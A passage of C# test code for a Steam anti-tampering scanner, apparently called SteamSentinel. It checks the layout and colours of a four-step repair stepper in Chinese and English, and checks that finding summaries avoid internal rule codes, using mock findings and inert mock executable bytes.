                ActionId = action.ActionId,
                Type = action.Type,
                Target = action.Target,
                Success = true,
                ExecutionStatus = RemediationExecutionStatus.Succeeded,
                VerificationStatus = RemediationVerificationStatus.Verified
            });
        }
        return result;
    }

    private static byte[] CreateMockExecutableBytes(string marker, int length = 256)
    {
        byte[] bytes = new byte[Math.Max(64, length)];
        bytes[0] = (byte)'M';
        bytes[1] = (byte)'Z';
        byte[] tag = Encoding.ASCII.GetBytes(marker);
        Array.Copy(tag, 0, bytes, 4, Math.Min(tag.Length, bytes.Length - 4));
        return bytes;
    }

    private static void VerifyRepairStepperStageUiContracts()
    {
        Finding prioritySample = new()
        {
            Id = "stepper-sample",
            RuleId = "STEAM-UI-EXTERNAL-SCRIPT",
            Category = FindingCategory.Steam,
            Severity = FindingSeverity.High,
            Score = 88,
            Title = "Mock UI finding",
            Target = @"C:\Steam\steamui\sp.js",
            CanRemediate = false,
            SuggestedActions = [SuggestedActionKind.ReviewOnly]
        };

        foreach ((int width, int height) in new[] { (1148, 780), (784, 460) })
        {
            foreach (CultureInfo culture in new[] { DisplayText.Chinese, DisplayText.English })
            {
                Localizer.Instance.ApplyLanguage(culture);
                MainWindow window = new();
                try
                {
                    using UiLayoutHarness layout = new(window, width, height);
                    UiPreview.ApplyAccessState(window, InstallationSecurityStatus.Protected, new(false, true));
                    window.ApplyScanReportForTesting(CreateScanReport(prioritySample));

                    string[] labels = culture.TwoLetterISOLanguageName == "zh"
                        ? ["准备与退出 Steam", "清理并备份风险", "恢复官方文件", "复查确认安全"]
                        : ["Prepare & Close", "Clean & Back Up", "Restore Official", "Verify Safe"];
                    window.BeginRepairStage(labels);

                    Border overlay = (Border)window.FindName("ScanStageOverlay");
                    FrameworkElement inlineRow = (FrameworkElement)window.FindName("InlineProgressRow");
                    StackPanel stepper = (StackPanel)window.FindName("RepairStepperPanel");
                    TextBlock stageTitle = TrustProxyUiText(window, "ScanStageTitleText");
                    TextBlock percentNumber = TrustProxyUiText(window, "ScanStagePercentNumber");
                    ProgressBar activityBar = (ProgressBar)window.FindName("ActivityProgressBar");
                    FrameworkElement findingsHost = (FrameworkElement)window.FindName("FindingsAreaHost");

                    foreach ((int step, double pct, string title) in new[]
                    {
                        (0, 15.0, labels[0]),
                        (1, 45.0, labels[1]),
                        (2, 80.0, labels[2]),
                        (3, 100.0, labels[3])
                    })
                    {
                        window.ReportRepairStep(step, pct, title, @"C:\Steam\steamui\sp.js", title);
                        layout.Refresh();

                        bool expectOverlay = findingsHost.ActualHeight >= 175;
                        bool expectStepper = expectOverlay && findingsHost.ActualHeight >= 255;
                        double pixelsPerDip = VisualTreeHelper.GetDpi(window).PixelsPerDip;
                        int expectedRoundedPercent = (int)Math.Round(Math.Clamp(pct, 1.0, 99.5));

                        Check($"Wave3 Stepper 阶段覆盖显示与胶囊颜色正常 ({culture.Name}/{width}x{height}/step{step})",
                            window.PriorityFindings.Count == 1 &&
                            (!expectOverlay || (overlay.Visibility == Visibility.Visible &&
                                                inlineRow.Visibility == Visibility.Collapsed &&
                                                layout.IsFullyVisible(stageTitle) &&
                                                layout.IsFullyVisible(percentNumber))) &&
                            (!expectStepper || (stepper.Visibility == Visibility.Visible &&
                                                stepper.Children.Count == 4 &&
                                                layout.IsFullyVisible(stepper) &&
                                                layout.DoNotOverlap(stepper.Children.Cast<FrameworkElement>()) &&
                                                VerifyStepperPillStates(stepper, step, pixelsPerDip))) &&
                            (!expectStepper && expectOverlay ? stepper.Visibility == Visibility.Collapsed : true) &&
                            !activityBar.IsIndeterminate &&
                            percentNumber.Text == expectedRoundedPercent.ToString(CultureInfo.InvariantCulture));
                    }

                    // 验证 HideActivity 彻底退出维修态且不影响常规 ShowActivity 无百分比契约
                    typeof(MainWindow).GetMethod("HideActivity", System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic)!
                        .Invoke(window, null);
                    layout.Refresh();
                    bool resetOk = overlay.Visibility == Visibility.Collapsed && stepper.Visibility == Visibility.Collapsed;

                    window.ShowActivity(MainWindow.ActivityPhase.Applying);
                    bool v0115Compatible =
                        ((Border)window.FindName("ActivityPanel")).Visibility == Visibility.Visible &&
                        !TrustProxyUiText(window, "ActivityElapsedText").Text.Contains('%') &&
                        activityBar.IsIndeterminate == SystemParameters.ClientAreaAnimation &&
                        stepper.Visibility == Visibility.Collapsed;

                    Check($"Wave3 Stepper HideActivity 彻底复位并兼容 V0115Ui ({culture.Name}/{width}x{height})",
                        resetOk && v0115Compatible);
                }
                finally
                {
                    CloseSummaryFixture(window);
                }
            }
        }
    }

    private static bool VerifyStepperPillStates(StackPanel stepper, int activeStep, double pixelsPerDip)
    {
        if (stepper.Children.Count != 4) return false;
        for (int i = 0; i < 4; i++)
        {
            if (stepper.Children[i] is not Border pill || pill.Child is not TextBlock text) return false;
            if (pill.ActualWidth <= 0 || pill.ActualHeight <= 0 || text.ActualWidth <= 0) return false;
            Typeface typeface = new(text.FontFamily, text.FontStyle, text.FontWeight, text.FontStretch);
            FormattedText formatted = new(
                text.Text,
                CultureInfo.CurrentUICulture,
                text.FlowDirection,
                typeface,
                text.FontSize,
                Brushes.Black,
                pixelsPerDip);
            if (formatted.WidthIncludingTrailingWhitespace > text.ActualWidth + 2.0) return false;
            Color bg = ((SolidColorBrush)pill.Background).Color;
            if (i < activeStep)
            {
                if (bg != Color.FromRgb(0xEC, 0xFD, 0xF5) || !text.Text.StartsWith("✓ ", StringComparison.Ordinal))
                    return false;
            }
            else if (i == activeStep)
            {
                if (bg != Color.FromRgb(0xEF, 0xF6, 0xFF))
                    return false;
            }
            else if (bg != Color.FromRgb(0xF1, 0xF5, 0xF9))
            {
                return false;
            }
        }
        return true;
    }

    private sealed class ImmediateProgressReport<T>(Action<T> report) : IProgress<T>
    {
        public void Report(T value) => report(value);
    }

    private static void VerifyPlainLanguageHandlingContracts()
    {
        foreach (CultureInfo culture in new[] { DisplayText.Chinese, DisplayText.English })
        {
            using IDisposable scope = DisplayText.UseCulture(culture);
            string expectedActionLabel = culture.TwoLetterISOLanguageName == "zh" ? "可直接修复" : "Ready to fix";
            string expectedReviewLabel = culture.TwoLetterISOLanguageName == "zh" ? "需进一步确认" : "Further review needed";

            Finding[] actionableSteamFindings =
            [
                new()
                {
                    RuleId = "STEAM-UI-EXTERNAL-SCRIPT",
                    Category = FindingCategory.Steam,
                    Severity = FindingSeverity.Critical,
                    Target = @"C:\Steam\steamui\sp.js",
                    CanRemediate = true,
                    IsKnownMalware = true,
                    ConfigurationKind = SteamConfigurationRepair.UiFile,
                    SuggestedActions = [SuggestedActionKind.RepairSteamConfiguration]
                },
                new()
                {
                    RuleId = "STEAM-UI-CSS-SUPPRESSION",
                    Category = FindingCategory.Steam,
                    Severity = FindingSeverity.High,
                    Target = @"C:\Steam\resource\webkit.css",
                    CanRemediate = true,
                    ConfigurationKind = SteamConfigurationRepair.PackageRestore,
                    SuggestedActions = [SuggestedActionKind.RepairSteamConfiguration]
                },
                new()
                {
                    RuleId = "STEAM-DLL-VERSION-FORWARDER",
                    Category = FindingCategory.Steam,
                    Severity = FindingSeverity.Critical,
                    Target = @"C:\Steam\versionOrg.dll",
                    CanRemediate = true,
                    IsKnownMalware = true,
                    SuggestedActions = [SuggestedActionKind.QuarantineFile]
                },
                new()
                {
                    RuleId = "STEAM-CLIENT-BINARY-TAMPERED",
                    Category = FindingCategory.Steam,
                    Severity = FindingSeverity.Critical,
                    Target = @"C:\Steam\steam.exe",
                    CanRemediate = true,
                    ConfigurationKind = SteamConfigurationRepair.PackageRestore,
                    SuggestedActions = [SuggestedActionKind.RepairSteamConfiguration]
                }
            ];

            foreach (Finding f in actionableSteamFindings)
            {
                SteamSentinel.App.ViewModels.FindingItemViewModel vm = new(f);
                Check($"Wave3 大白话处理列与摘要无内部规则黑话 ({culture.Name}/{f.RuleId})",
                    vm.HandlingLabel == expectedActionLabel &&
                    !string.IsNullOrWhiteSpace(vm.HandlingReasonSummary) &&
                    !vm.HandlingReasonSummary.Contains("STEAM-", StringComparison.Ordinal) &&
                    !vm.HandlingReasonSummary.Contains("HEUR-", StringComparison.Ordinal));
            }

            Finding scriptTokens = new()
            {
                RuleId = "HEUR-SCRIPT-TOKEN-COOCCURRENCE",
                Category = FindingCategory.File,
                Severity = FindingSeverity.Low,
                Target = @"C:\App\normal.dll",
                CanRemediate = false,
                SuggestedActions = [SuggestedActionKind.ReviewOnly]
            };
            SteamSentinel.App.ViewModels.FindingItemViewModel scriptVm = new(scriptTokens);
            Check($"Wave3 常见脚本词首行大白话无规则码且详情保留规则号 ({culture.Name})",
                scriptVm.HandlingLabel == expectedReviewLabel &&
                !scriptVm.HandlingReasonSummary.Contains("HEUR-SCRIPT-TOKEN-COOCCURRENCE", StringComparison.Ordinal) &&
                scriptVm.HandlingReason.Contains("HEUR-SCRIPT-TOKEN-COOCCURRENCE", StringComparison.Ordinal));
        }
    }

    private static bool IsButtonTextFullyVisible(Button button, double pixelsPerDip)
    {
        if (button.Visibility != Visibility.Visible || button.ActualWidth <= 0 || button.ActualHeight <= 0)
            return false;
        string text = button.Content as string ?? button.Content?.ToString() ?? string.Empty;
        if (string.IsNullOrEmpty(text)) return true;

        Typeface typeface = new(button.FontFamily, button.FontStyle, button.FontWeight, button.FontStretch);
        FormattedText formatted = new(
            text,
            CultureInfo.CurrentUICulture,
            button.FlowDirection,
            typeface,
            button.FontSize,
            Brushes.Black,
            pixelsPerDip);

        TextBlock? innerText = UiLayoutHarness.Descendants<TextBlock>(button).FirstOrDefault();
        double availableWidth = innerText is { ActualWidth: > 0 }
            ? innerText.ActualWidth
            : Math.Max(0, button.ActualWidth - button.Padding.Left - button.Padding.Right - 4);
        return formatted.WidthIncludingTrailingWhitespace <= availableWidth + 1.5 &&
               button.ActualHeight >= formatted.Height + button.Padding.Top + button.Padding.Bottom - 0.5;
    }
}
